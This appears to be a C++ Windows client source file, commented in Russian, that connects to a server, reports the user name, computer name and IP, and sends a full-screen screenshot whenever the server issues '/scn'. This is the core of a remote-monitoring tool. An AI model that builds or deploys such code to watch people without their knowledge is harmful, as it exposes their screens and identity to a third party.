#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include "Client.h"
#include <iostream>
#include <windows.h>
#include <Lmcons.h>
#include <sstream>
#include <thread>

#include "Constants.h"

#pragma comment(lib, "ws2_32.lib")

Client::Client(const char* serverIP_, u_short port_) : m_serverIP(serverIP_), m_port(port_) {
    WSADATA wsData;
    WORD DLLVersion = MAKEWORD(2, 1);
    if (WSAStartup(DLLVersion, &wsData) != 0)
    {
        std::cerr << "Error initializing Winsock" << std::endl;
        stop();
    }

    m_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (m_socket == INVALID_SOCKET)
    {
        std::cerr << "Can't create a socket! Quitting" << std::endl;
        stop();
    }

    SOCKADDR_IN addr;
    addr.sin_addr.s_addr = inet_addr(serverIP_);
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port_);

    int connResult = connect(m_socket, (sockaddr*)&addr, sizeof(addr));
    if (connResult == SOCKET_ERROR)
    {
        std::cerr << "Can't connect to server! Quitting" << std::endl;
        stop();
    }
}

Client::~Client() {
    closesocket(m_socket);
    WSACleanup();
}

/**
 * Начало сеанса.
 */
void Client::start() {
    sendClientInfo();
    std::thread commandThread(&Client::listenForCommands, this);
    commandThread.join();
}

/**
 * Завершение сеанса.
 */
void Client::stop() const {
    closesocket(m_socket);
    WSACleanup();
}

/**
 * Получить IPv4 адрес.
 * @return Строка с IPv4 адресом текущего клиента, в случае успеха.
 */
std::string getLocalIPv4() {
    char hostname[256];
    if (gethostname(hostname, sizeof(hostname)) != 0)
    {
        std::cerr << "gethostname failed" << std::endl;
        return "";
    }

    hostent* host = gethostbyname(hostname);
    if (host == nullptr)
    {
        std::cerr << "gethostbyname failed" << std::endl;
        return "";
    }

    for (char** addr = host->h_addr_list; *addr != nullptr; ++addr)
    {
        struct in_addr* ipv4 = reinterpret_cast<struct in_addr*>(*addr);
        if (ipv4)
        {
            return inet_ntoa(*ipv4);
        }
    }

    return "";
}

/**
 * Отправить основную информацию о текущем клиенте.
 */
void Client::sendClientInfo() const
{
    // Время подключения
    auto now = std::chrono::system_clock::now();
    std::time_t currentTime = std::chrono::system_clock::to_time_t(now);
    std::stringstream timeStream;
    timeStream << std::put_time(std::localtime(&currentTime), "%d-%m-%Y %H:%M:%S");

    // Имя пользователя
    char username[UNLEN + 1];
    DWORD username_len = UNLEN + 1;
    GetUserNameA(username, &username_len);

    // Имя компьютера
    char computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD computerName_len = MAX_COMPUTERNAME_LENGTH + 1;
    GetComputerNameA(computerName, &computerName_len);

    // IP-адрес
    std::string ipAddress = getLocalIPv4(); // Используем IP-адрес сервера для упрощения

    // Собираем информацию в строку
    std::stringstream infoStream;
    infoStream << timeStream.str() << " | ";
    infoStream << "User: " << username << " | ";
    infoStream << "PC Name: " << computerName << " | ";
    infoStream << "IP Address: " << ipAddress;

    // Отправляем информацию на сервер
    std::string clientInfo = infoStream.str();
    int sendResult = send(m_socket, clientInfo.c_str(), clientInfo.size() + 1, 0);
    if (sendResult == SOCKET_ERROR)
    {
        std::cerr << "Failed to send client info, error: " << WSAGetLastError() << std::endl;
    }
}

/**
 * Обработка снимка экрана и запись в файл (*bmp).
 * @param wPath Путь к файлу.
 */
std::vector<BYTE> Client::captureScreenshot() {
    // Изменяем метод на возврат вектора байтов
    HDC hDC = GetDC(NULL);
    HDC hMemDC = CreateCompatibleDC(hDC);
    
    // Получаем размеры экрана
    int width = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    int height = GetSystemMetrics(SM_CYVIRTUALSCREEN);
    
    HBITMAP hBitmap = CreateCompatibleBitmap(hDC, width, height);
    SelectObject(hMemDC, hBitmap);
    
    // Копируем данные с экрана
    BitBlt(hMemDC, 0, 0, width, height, hDC, 0, 0, SRCCOPY);
    
    // Создаем заголовок BMP
    BITMAPFILEHEADER bmfHeader;
    BITMAPINFOHEADER bi;
    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = width;
    bi.biHeight = height;
    bi.biPlanes = 1;
    bi.biBitCount = 24; // 24 бита на пиксель
    bi.biCompression = BI_RGB;
    bi.biSizeImage = 0;
    bi.biXPelsPerMeter = 0;
    bi.biYPelsPerMeter = 0;
    bi.biClrUsed = 0;
    bi.biClrImportant = 0;

    // Выделяем память для данных изображения
    std::vector<BYTE> imageData(width * height * 3 + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER));
    DWORD dwSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    
    // Заполняем заголовок BMP
    bmfHeader.bfType = 'MB';
    bmfHeader.bfSize = dwSize + imageData.size() - sizeof(BITMAPFILEHEADER);
    bmfHeader.bfReserved1 = 0;
    bmfHeader.bfReserved2 = 0;
    bmfHeader.bfOffBits = dwSize;

    // Копируем данные в вектор
    memcpy(imageData.data(), &bmfHeader, sizeof(BITMAPFILEHEADER));
    memcpy(imageData.data() + sizeof(BITMAPFILEHEADER), &bi, sizeof(BITMAPINFOHEADER));
    GetDIBits(hDC, hBitmap, 0, height, imageData.data() + dwSize, (BITMAPINFO*)&bi, DIB_RGB_COLORS);

    // Освобождаем ресурсы
    DeleteObject(hBitmap);
    DeleteDC(hMemDC);
    ReleaseDC(NULL, hDC);

    return imageData; // Возвращаем данные изображения
}

/**
 * Обработка и отправка на сервер снимка экрана.
 */
void Client::sendScreenshot(SOCKET sock) {
    // Захватываем скриншот и получаем данные
    std::vector<BYTE> screenshotData = captureScreenshot();

    // Отправляем данные скриншота
    int totalBytesSent = 0;
    int dataSize = static_cast<int>(screenshotData.size());
    
    // Отправляем размер данных перед отправкой самого изображения
    int sizeSent = send(sock, reinterpret_cast<char*>(&dataSize), sizeof(dataSize), 0);
    if (sizeSent == SOCKET_ERROR) {
        std::cerr << "Failed to send data size, error: " << WSAGetLastError() << std::endl;
        return;
    }

    // Теперь отправляем данные скриншота
    while (totalBytesSent < dataSize) {
        int bytesSent = send(sock, reinterpret_cast<char*>(screenshotData.data()) + totalBytesSent, dataSize - totalBytesSent, 0);
        if (bytesSent == SOCKET_ERROR) {
            std::cerr << "Failed to send screenshot data, error: " << WSAGetLastError() << std::endl;
            break;
        }
        totalBytesSent += bytesSent;
    }
}

/**
 * Обработка ответа сервера.
 */
void Client::listenForCommands() const
{
    char buf[4096];
    while (true)
    {
        ZeroMemory(buf, 4096);
        int bytesReceived = recv(m_socket, buf, 4096, 0);
        if (bytesReceived != SOCKET_ERROR)
        {
            std::string command(buf, 0, bytesReceived);
            if (command == "/scn")
            {
                std::cout << "Received screenshot command" << std::endl;
                sendScreenshot(m_socket);
            }
            else if (command == "/exit")
            {
                std::cout << "Server is shutting down" << std::endl;
            }
        }
    }
}
